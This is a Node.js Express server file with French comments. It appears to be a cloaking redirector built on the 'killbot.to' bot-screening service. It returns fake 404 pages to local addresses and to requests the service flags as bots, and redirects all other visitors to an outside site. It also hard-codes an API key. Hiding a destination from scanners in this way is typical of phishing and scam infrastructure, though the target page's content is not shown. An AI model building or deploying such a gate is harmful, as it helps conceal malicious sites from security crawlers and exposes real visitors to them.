import express from 'express';
import KillBot from 'killbot.to';

const app = express();
const PORT = process.env.PORT || 3000;
const apiKey = '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const config = 'default';
const killBot = new KillBot(apiKey, config);

function isLocalIp(ip) {
  // On considère locale/invalide
  if (!ip) return true;
  if (
    ip.startsWith('10.') ||
    ip.startsWith('127.') ||
    ip.startsWith('192.168.') ||
    ip.startsWith('::1') ||
    ip === '0.0.0.0'
  ) {
    return true;
  }
  return false;
}

app.get('/', async (req, res) => {
  // Récupération IP
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  if (ip.includes(',')) {
    ip = ip.split(',')[0].trim();
  }

  // Si IP locale => renvoyer direct un faux 404
  if (isLocalIp(ip)) {
    return res.status(404).send('Not Found');
  }

  try {
    // Tenter KillBot
    const result = await killBot.checkReq(req);
    if (result.block) {
      return res.status(404).send('Not Found (KillBot block)');
    } else {
      // sinon redirection
      return res.redirect('https://maurpie.com');
    }
  } catch (err) {
    console.error('KillBot error:', err);
    // En cas d'erreur "Invalid IP address provided" => 404
    return res.status(404).send('Not Found (KillBot error)');
  }
});

app.listen(PORT, () => {
  console.log(`Serveur démarré sur le port ${PORT}`);
});